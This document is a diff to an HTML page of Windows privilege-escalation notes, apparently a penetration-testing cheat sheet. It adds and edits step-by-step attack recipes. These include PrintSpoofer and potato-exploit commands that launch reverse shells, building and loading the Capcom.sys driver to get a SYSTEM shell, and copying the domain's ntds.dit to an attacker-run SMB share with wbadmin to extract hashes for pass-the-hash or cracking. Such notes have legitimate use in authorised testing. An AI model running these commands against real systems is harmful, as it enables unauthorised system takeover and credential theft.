@@ -722,35 +722,6 @@
 
     <h2>Prilivege Abuse</h2>
     <li>SeImpersonatePrivilege</li>
-    <ul>
-        <li>Hot Potato</li>
-        <ul>
-            <li>This works on Windows 7, 8, and early versions of 10.</li>
-            <li>It also works on the server counterparts.  Patched on latest Windows 10.  </li>
-            <li>***Does not require SeImpersonatePrivilege.*** like the other potato exploits</li>
-            <li>Other Potato exploits work better and are easier to work with</li>
-            <ul>
-                <li>Instructions</li>
-                <ul>
-                    <li>Get shell with low privilege user account.</li>
-                    <li>Set listener waiting for Potato exploit.  </li>
-                </ul>
-                <li>nc -lvnp 4444</li>
-                <ul>
-                    <li>Run potato.exe on victim machine:</li>
-                    <ul>
-                        <li>potato.exe -ip &lt;victim ip&gt; -cmd &quot;C:\reverse\shell.exe"</li>
-                        <ul>
-                            <li>For windows 7 add to command</li>
-                            <ul>
-                                <li>-enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true</li>
-                            </ul>
-                        </ul>
-                    </ul>
-                </ul>
-            </ul>
-        </ul>
-    </ul>
     <li>Rotten Potato</li>
     <ul>
         <li>Works up until sometime in 2019. </li>
@@ -758,22 +729,11 @@
     </ul>
     <li>Juicy Potato</li>
     <ul>
-        <li>Juicy Potato replaced Rotten Potato (works better)</li>
-        <li>Patched on latest Windows 10</li>
-        <li>Instructions:</li>
-        <ul>
-            <li>Get shell w/ SeImpersonatePrivilege Enabled user.</li>
-            <li>Set listener waiting for potato exploit.</li>
-            <li>Execute JuicyPotato.exe on Windows machine</li>
-            <ul>
-                <li>JuicyPotato.exe -l 1337 -p &lt;program&gt; -t * -c &lt;{CLSID}&gt;</li>
-            </ul>
-        </ul>
+        <li>JuicyPotato.exe -l 1337 -p &lt;program&gt; -t * -c &lt;{CLSID}&gt;</li>
     </ul>
 
     <li>Rogue Potato</li>
     <ul>
-        <li>May have been patched sometime in 2021</li>
         <li>More advanced and complicated than previous potato exploits.</li>
         <li>Instructions</li>
         <ul>
@@ -781,6 +741,160 @@
             <li>On victim Windows machine: RoguePotato.exe -r 10.0.0.5 -l 9999 -e "C:\windows\system32\cmd.exe"</li>
         </ul>
     </ul>
+    <li>PrintSpoofer</li>
+    <ul>
+        <li>Targets print spooler service</li>
+        <li>Does not require any port forwarding like potato exploits.</li>
+        <li>The entire exploit runs on the target machine. </li>
+        <li>Requires C++ redistributable is installed.</li>
+        <li>PrintSpoofer.exe -i -c "C:\reverse\shell.exe"</li>
+    </ul>
+    <li>SeAssignPrimaryTokenPrivilege</li>
+    <ul>
+        <li>Potato Exploits</li>
+    </ul>
+    <li>SeLoadDriverPrivilege</li>
+    <ul>
+        <li>Create folder called Fuse and put files into it:</li>
+        <ul>
+            <li>Capcom.sys from fuzzysecurity</li>
+            <li>https://github.com/TarlogicSecurity/EoPLoadDriver/</li>
+            <ul>
+                <li>eoploaddriver.cpp</li>
+            </ul>
+            <li>Exploitcapcom from github</li>
+        </ul>
+        <li>Compile EoPLoadDriver in visual studio</li>
+        <ul>
+            <li>Create a new project</li>
+            <ul>
+                <li>Console app</li>
+                <li>Name it LoadDriver</li>
+            </ul>
+            <li>Open LoadDriver.cpp</li>
+            <ul>
+                <li>Replace all contents with contents from eoploaddriver.cpp</li>
+            </ul>
+            <li>Select "Release" and "x64"</li>
+            <li>Build --> Rebuild Solution.  LoadDriver.exe should be created.</li>
+            <li>Copy LoadDriver.exe file to the Fuse folder</li>
+        </ul>
+        <li>Compile ExploitCapCom</li>
+        <ul>
+            <li>File --> Open -- Project/Solution</li>
+            <ul>
+                <li>Select Exploit Capcom</li>
+                <li>Set "Release" and "x64"</li>
+                <li>Rebuild solution</li>
+                <li>ExploitCapCom.exe should be created</li>
+            </ul>
+        </ul>
+        <li>Transfer ExploitCapCom.exe, LoadDriver.exe, and capcom.sys to victim machine</li>
+        <ul>
+            <li>LoadDriver.exe System\CurrentControlSet\MyService C:\&lt;path to capcom.sys&gt;</li>
+            <li>.\ExploitCapCom.exe</li>
+            <li>Should have system shell.</li>
+        </ul>
+    </ul>
+
+    <li>SeBackupPrivilege</li>
+    <ul>
+        <li>Grants read access to all objects on the system regardless of ACL</li>
+        <ul>
+            <li>Read sensitive files</li>
+            <li>Extract hashes</li>
+            <ul>
+                <li>Pass-the-hash</li>
+                <li>Crack them</li>
+            </ul>
+        </ul>
+        <li>Backup ntds file to SMB server</li>
+        <table>
+            <tr>
+                <td>Create NTFS share on attacker</td>
+                <td>
+                    <table>
+                        <tr>
+                            <td>Create 2gb NTFS folder called ntfs.disk</td>
+                            <td>dd if=/dev/zero of=ntfs.disk bs=1024M count=2</td>
+                        </tr>
+                        <tr>
+                            <td>Create loopback setup</td>
+                            <td>sudo losetup -fP ntfs.disk</td>
+                        </tr>
+                        <tr>
+                            <td>Check losetup</td>
+                            <td>losetup -a</td>
+                        </tr>
+                        <tr>
+                            <td>Create NTFS disk</td>
+                            <td>sudo mkfs.ntfs /dev/loop0</td>
+                        </tr>
+                        <tr>
+                            <td>Mount NTFS disk to a folder</td>
+                            <td>sudo mount /dev/loop0 ./smb</td>
+                        </tr>
+                        <tr>
+                            <td>Edit SMB to setup SMB share</td>
+                            <td>
+                                <li>sudo vi /etc/samba/smb.conf</li>
+                                <table>
+                                    [shared]
+                                    comment = &lt;anything&gt;
+                                    browseable = yes
+                                    path = &lt;local path to SMB share&gt;
+                                    read only = no
+                                    guest = yes
+                                </table>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td>Start smb share</td>
+                            <td>sudo systemctl restart smbd</td>
+                        </tr>
+                    </table>
+                </td>
+            </tr>
+            <tr>
+                <td>Backup ntds file from victim</td>
+                <td>echo y | wbadmin start backup -backuptarget:\\&lt;ip address&gt;\share -include:C:\windows\ntds\</td>
+            </tr>
+            <tr>
+                <td>extract contents of .vhdx on victim (using attacker SMB share)</td>
+                <td>
+                    <li>echo y | wbadmin start recovery -version:&lt;version&gt; -itemtype:file -items:C:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl</li>
+                    <li>Get version</li>
+                    <ul>
+                        <li>victim: "wbadmin get versions"</li>
+                        <ul>
+                            <li>Version identified:&lt;version&gt;</li>
+                        </ul>
+                    </ul>
+                    <li>ntds.dit should be in C:\</li>
+                </td>
+            </tr>
+        </table>
+    </ul>
+
+    <li>SeRestorePrivilege</li>
+    <ul>
+        <li>Grants write access to all objects on the system regardless of ACL</li>
+        <li>Modify service binaries</li>
+        <li>Overwrite DLLs used by SYSTEM processes</li>
+        <li>Modify registry settings</li>
+    </ul>
+
+    <li>SeTakeOwnershipPrivilege</li>
+    <ul>
+        <li>Lets the owner take ownership over an object</li>
+        <li>Same as SeRestorePrivilege after taking ownership of files</li>
+    </ul>
+    <li>More reading on token abuse: https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt</li>
+
+    <br>
+
+    <h2>Always Install Elevated</h2>
+
 
 
 
